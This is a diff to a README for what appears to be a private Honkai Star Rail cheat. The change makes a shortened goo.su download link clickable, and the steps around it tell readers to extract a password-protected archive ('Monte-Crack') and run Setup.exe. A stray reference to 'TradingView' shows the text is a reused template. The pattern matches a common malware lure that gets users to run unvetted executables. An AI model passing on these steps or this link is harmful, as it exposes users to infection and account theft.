@@ -23,7 +23,7 @@ Embark on an unparalleled interstellar adventure with our **exclusive private Ho
 
 ## Installation 🛠️
 
-1. **Download:** [Grab the latest Release of the enhanced version.](goo.su/9ijgqia) 📥
+1. **Download:** [Grab the latest Release of the enhanced version.](https://goo.su/9ijgqia) 📥
 2. **Extract:** Unzip the files to your desktop using the password **Monte-Crack**. 🖥️
 3. **Install:** Run **Setup.exe** and select HSR path. 🖱️
 4. **Enjoy!** Start using the enhanced TradingView experience. 🎉
